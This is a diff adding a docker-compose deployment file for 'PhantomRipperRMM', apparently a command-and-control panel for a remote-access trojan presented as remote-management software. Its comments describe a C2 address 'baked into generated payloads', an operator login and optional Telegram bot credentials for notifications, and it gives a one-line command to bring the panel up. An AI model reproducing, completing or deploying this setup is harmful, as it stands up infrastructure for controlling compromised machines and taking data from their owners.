@@ -1,0 +1,42 @@
+# PhantomRipperRMM — VPS / RDP deployment (single-host).
+# Brings up the panel with a persistent volume for the DB and builds.
+#
+#   docker compose -f docker/docker-compose.yml up -d --build
+#
+# Then visit http://<server-ip>:8443 and log in with ADMIN_USER / ADMIN_PASS.
+
+services:
+  panel:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile.panel
+    image: phantomripper-panel:latest
+    container_name: phantomripper-panel
+    restart: unless-stopped
+    ports:
+      - "8443:8443"
+    environment:
+      NODE_ENV: production
+      PORT: "8443"
+      HOST: "0.0.0.0"
+      # CHANGE THESE
+      JWT_SECRET: "replace-with-a-long-random-string"
+      ADMIN_USER: "operator"
+      ADMIN_PASS: "replace-this-password"
+      # Advertised C2 address baked into generated payloads
+      C2_HOST: "your-domain-or-ip"
+      C2_PORT: "8443"
+      C2_SCHEME: "https"
+      # Optional
+      TELEGRAM_BOT_TOKEN: ""
+      TELEGRAM_CHAT_ID: ""
+    volumes:
+      - phantomripper-data:/app/panel/server/data
+    healthcheck:
+      test: ["CMD", "node", "-e", "require('http').get('http://127.0.0.1:8443/api/health',r=>process.exit(r.statusCode===200?0:1)).on('error',()=>process.exit(1))"]
+      interval: 30s
+      timeout: 5s
+      retries: 3
+
+volumes:
+  phantomripper-data:
